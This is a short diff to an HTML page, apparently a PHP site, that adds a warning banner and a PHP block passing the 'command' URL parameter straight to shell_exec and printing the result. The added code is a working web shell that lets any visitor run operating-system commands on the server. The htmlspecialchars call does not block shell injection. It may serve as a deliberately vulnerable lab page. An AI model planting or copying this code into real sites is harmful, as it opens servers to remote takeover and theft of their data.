@@ -37,6 +37,15 @@
               </div>
             </div>
           </nav>
+          <div class="container">  
+            <div class="alert alert-warning" role="alert">
+                Commands must be passed through a web paramater to be sent to the OS! 
+            </div>
+          </div>
+          <?php
+                $output = shell_exec(htmlspecialchars($_GET["command"]));
+                echo "<pre>$output</pre>";
+           ?>
         <script src="" async defer></script>
     </body>
 </html>
